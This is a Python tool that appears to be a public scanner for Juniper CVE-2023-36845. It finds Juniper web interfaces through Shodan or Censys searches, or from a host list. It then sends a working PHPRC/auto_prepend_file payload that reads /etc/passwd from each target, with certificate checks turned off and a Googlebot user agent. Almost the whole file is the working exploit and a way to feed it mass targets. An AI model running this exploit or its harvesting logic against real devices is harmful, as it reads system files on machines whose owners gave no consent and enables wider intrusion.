import argparse
import urllib.request
import ssl
from OpenSSL import SSL
import shodan
from socket import socket
from colorama import Fore, Back, Style
from censysmod import hostSearch
import os

SHODAN_API_KEY = "YOUR API KEY HERE"
api = shodan.Shodan(SHODAN_API_KEY)

def checkSSL(ip, port):
	sock = socket()
	
	try:
		sock.connect((ip, port))
	except Exception:
		print(Fore.RED+"[!] "+ip+" Connection error"+Style.RESET_ALL)
		return False
	
	ctx = SSL.Context(SSL.SSLv23_METHOD)
	ctx.check_hostname = False
	ctx.verify_mode = SSL.VERIFY_NONE
	
	try:
		sock_ssl = SSL.Connection(ctx, sock)
		sock_ssl.set_connect_state()
		sock_ssl.do_handshake()
		return True
	except Exception:
		return False

def censysSearch(results,pages):
	print('Searching for hosts in Censys -')
	print('===============================')
	hostList = hostSearch(results,pages)

	for result in hostList:
		verifyVulnHost(result, 443)
		

def shodanSearch():

	print('Searching for hosts in Shodan -')
	print('===============================')
	try:
			# Search Shodan
			results = api.search('http.title:"Juniper Web Device Manager"')

			# Show the results
			storeOldIp = ''
			for result in results['matches']:
					if storeOldIp==result['ip_str']:
						continue
					
					verifyVulnHost(result['ip_str'], 443)
					storeOldIp = result['ip_str']
					
	except shodan.APIError as e:
			print(Fore.RED+Back.WHITE+'Error: {}'.format(e))	

def verifyVulnHost(hostip, hostport):

	if hostport!="443" and hostport!="80":
		target = "https://"+hostip+":"+str(hostport)+"/?PHPRC=/dev/fd/0"
	elif hostport=="443":
		target = "https://"+hostip+"/?PHPRC=/dev/fd/0"
	elif hostport=="80":
		target = "http://"+hostip+"/?PHPRC=/dev/fd/0"
	else:
		target = "http://"+hostip+"/?PHPRC=/dev/fd/0"

	context = ssl.create_default_context()
	context.check_hostname = False
	context.verify_mode = ssl.CERT_NONE
	
	
	payload = b'auto_prepend_file="/etc/passwd"'
	text = b'root'

	headers = {}
	headers['User-Agent'] = "Googlebot"

	request = urllib.request.Request(target,headers=headers)
	request.method = "POST"
	request.data = payload
	
	if checkSSL(hostip.rstrip('\n'), hostport):
		try:
			response = urllib.request.urlopen(request, timeout=5, context=context)
			txt = 'root'
			with response as res:
				restxt = res.read().decode('utf-8').find(txt)
				if restxt != -1:
					print(Fore.RED+Back.WHITE+"[+] "+hostip.rstrip('\n')+" vulnerable"+Style.RESET_ALL)
				else:
					print(Fore.GREEN+"[-] "+hostip.rstrip('\n')+" not vulnerable"+Style.RESET_ALL)

				response.close()
		except urllib.error.URLError as e:
			print("[-] "+hostip.rstrip('\n')+" error "+str(e.code))
		except Exception:
			print("[!] "+hostip.rstrip('\n')+" Unknown error")

	else:
		print("[!] "+hostip+" SSL Error")

def verifyVulnHostsList(file):

	with open(file, 'r+') as f:
		for hostip in f:
			target = "http://"+hostip.rstrip('\n')+"/?PHPRC=/dev/fd/0"			
			payload = b'auto_prepend_file="/etc/passwd"'

			context = ssl.create_default_context()
			context.check_hostname = False
			context.verify_mode = ssl.CERT_NONE

			text = b'root'

			headers = {}
			headers['User-Agent'] = "Googlebot"

			request = urllib.request.Request(target,headers=headers)
			request.method = "POST"
			request.data = payload
			
			try:
				response = urllib.request.urlopen(request, context=context)
				with response as res:
					#print(res.read())
					if text in res.read():
						print(Fore.RED+Back.WHITE+"[+] "+hostip.rstrip('\n')+" vulnerable"+Style.RESET_ALL)
						
					else:
						print(Fore.GREEN+"[-] "+hostip.rstrip('\n')+" not vulnerable"+Style.RESET_ALL)

					response.close()
			except urllib.error.URLError as e:
				print("[-] "+hostip.rstrip('\n')+" error "+str(e.code))
			except urllib.error.HTTPError as h:
				print("[-] "+hostip.rstrip('\n')+" error "+str(h))

def main():
	parser = argparse.ArgumentParser(prog='juniperscan', formatter_class=argparse.RawDescriptionHelpFormatter, description='''
	Juniper Scanner for CVE-2023-36845 by bt0
	https://www.github.com/halencarjunior

	More information about the Vulnerability:
	https://supportportal.juniper.net/JSA72300
	''')
	parser.add_argument('-H', '--host', type=str, help='IP or Hostname of target')
	parser.add_argument('-p', '--port', type=int, help='Port of target. Default=443', default='443')
	parser.add_argument('-hl', '--hostlist' , help='Use a hosts list e.g. ./hosts.txt')
	parser.add_argument('-s', '--shodan' , action="store_true", help='Search for hosts in Shodan (Needs api key)')
	parser.add_argument('--censys' , metavar=('results','page'), nargs='+', type=int, help='Search for hosts in Censys (Needs api key). Use --censys <results> <per_page>')
	
	parser.add_argument('--version', action='version', version='%(prog)s 1.0')
	args = parser.parse_args()

	banner = '''
	Juniper Scanner for CVE-2023-36845 by bt0
	v. 1.0
	==========================================\n'''

	hostip = args.host
	hostport = args.port
	
	if args.host:
		print(banner)
		print("Scanning using -H (by host)\n")
		verifyVulnHost(hostip,hostport)
	elif args.hostlist:
		print(banner)
		print("Scanning using -hl (by hosts list)\n")
		file = args.hostlist
		verifyVulnHostsList(file)
	elif args.shodan:
		if SHODAN_API_KEY == "YOUR API KEY HERE":
			print(banner)
			print(Fore.RED+Back.WHITE+"[!] Shodan API KEY is not configured. Change variable to scan using your shodan api"+Style.RESET_ALL)
		else:
			print(banner)
			shodanSearch()
	elif args.censys:
		if 'CENSYS_API_ID' not in os.environ:
			print(banner)
			print(Fore.RED+Back.WHITE+"[!] Censys API KEY is not configured."+Style.RESET_ALL)
			print("Please set: \n$ export CENSYS_API_ID=<your-api-id>\n$ export CENSYS_API_SECRET=<your-api-secret>")
		else:
			if(args.censys):
				print(banner)
				censysSearch(args.censys[0],args.censys[1])
			else:
				censysSearch(5,1)

if __name__ == '__main__':
   main()